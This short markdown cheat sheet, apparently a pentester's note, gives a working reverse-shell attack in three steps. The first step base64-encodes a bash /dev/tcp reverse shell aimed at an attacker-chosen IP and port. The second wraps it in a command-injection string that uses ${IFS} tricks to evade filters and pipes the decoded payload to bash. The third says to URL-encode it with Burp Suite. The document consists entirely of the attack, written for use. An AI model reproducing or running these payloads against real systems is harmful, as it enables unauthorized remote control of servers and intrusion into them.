## Reverse Shell Commands

### Taking Reverse Shell By Sending URL Encoded Payload in the HTTP Request:

1. Encoding the Message into Base64 first!

```
echo "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1" | base64 -w 0
```

2. Then Putting the Encoded Payload in the following URL Encoded Command:

```
;echo${IFS%??}"<your payload here>"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

3. Do URL Encode all the Key Character, do this by using Burpsuite.
